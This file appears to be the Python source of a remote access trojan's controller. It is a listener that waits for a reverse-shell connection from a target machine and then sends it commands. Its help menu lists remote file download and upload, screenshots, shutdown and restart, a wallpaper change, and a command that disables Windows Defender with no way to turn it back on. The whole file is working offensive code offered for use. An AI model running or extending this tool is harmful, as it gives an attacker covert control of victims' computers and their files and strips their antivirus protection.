#!/usr/bin/python
import socket
import json
import base64

def banner():
    print("""
  _______            __                      __    __                  __    __ 
 /       \          /  |                    /  |  /  |                /  |  /  |
 $$$$$$$  | ______  $$/   ______    ______  $$/  _$$ |_    __    __   $$ |  $$ |
 $$ |__$$ |/      \ /  | /      \  /      \ /  |/ $$   |  /  |  /  |  $$  \/$$/ 
 $$    $$//$$$$$$  |$$ |/$$$$$$  |/$$$$$$  |$$ |$$$$$$/   $$ |  $$ |   $$  $$<  
 $$$$$$$/ $$ |  $$/ $$ |$$ |  $$ |$$ |  $$/ $$ |  $$ | __ $$ |  $$ |    $$$$  \ 
 $$ |     $$ |      $$ |$$ \__$$ |$$ |      $$ |  $$ |/  |$$ \__$$ |   $$ /$$  |
 $$ |     $$ |      $$ |$$    $$/ $$ |      $$ |  $$  $$/ $$    $$ |  $$ |  $$ |
 $$/      $$/       $$/  $$$$$$/  $$/       $$/    $$$$/   $$$$$$$ |  $$/   $$/ 
                                                          /  \__$$ |            
                                                          $$    $$/             
                                                           $$$$$$/              
    """)

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def help(self):
        print('[!] Welcome to our help page!\n')
        print("--- General Modules ---")
        print('[?] os | Displays target OS)')
        print('[?] cd | Changes working directory of target')
        print('[?] ip | Displays local IP of target')
        print('[?] host | Displays computer name of target')
        print('[?] shutdown | Makes the target computer shutdown')
        print('[?] restart | Makes the target computer restart')
        print('[?] download | Downloads file of target machine to your machine')
        print('[?] upload | Uploads file of your machine to target machine')
        print('[?] screenshot | Makes a screenshot of target machine\n')
        print("--- Windows Only Modules ---")
        print("[?] background | Changes windows background)")
        print("[?] antivirus | Disables windows defender (without any way to turn it on)")

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)

                if command[0] == "help":
                    self.help()

            except Exception:
                result = "[-] Error during command execution."

            print(result)


banner()
my_listener = Listener("10.0.2.17", 4444)
my_listener.run()